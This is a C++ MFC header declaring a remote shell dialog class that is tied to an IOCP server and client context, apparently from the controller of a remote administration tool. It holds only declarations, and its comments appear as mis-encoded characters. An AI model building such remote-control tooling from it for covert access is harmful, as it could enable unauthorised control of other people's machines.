#pragma once
#include "afxwin.h"
#include "include/IOCPServer.h"

// CShellDlg �Ի���

class CShellDlg : public CDialogEx
{
	DECLARE_DYNAMIC(CShellDlg)

public:
	CShellDlg(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // ��׼���캯��
	virtual ~CShellDlg();

// �Ի�������
	enum { IDD = IDD_SHELL };

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

	DECLARE_MESSAGE_MAP()
public:
	CEdit m_edit;

private:
	HICON m_hIcon;
	ClientContext *m_pContext;
	CIOCPServer *m_pIocpServer;
	UINT m_nCurSel;
	UINT m_nReceiveLength;

public:
	afx_msg void OnClose();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	virtual BOOL OnInitDialog();
	afx_msg void OnEnChangeEdit1();
	afx_msg HBRUSH OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor);
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	void OnReceiveComplete(void);
private:
	void AddKeyBoardData(void);
};
